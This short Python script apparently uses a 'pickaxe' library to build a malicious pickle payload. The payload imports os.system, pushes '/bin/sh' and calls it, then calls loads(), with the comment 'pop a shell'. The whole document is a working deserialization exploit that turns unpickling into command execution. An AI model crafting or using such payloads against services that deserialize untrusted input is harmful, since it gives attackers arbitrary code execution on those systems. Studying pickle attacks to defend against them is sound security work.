from pickaxe import Crafter
import pickle


if __name__ == "__main__":
    payload = Crafter()
    payload.import_from("os", "system", use_stack=False)
    payload.push_str("/bin/sh")
    payload.call_f(1)

    # pop a shell
    payload.loads()
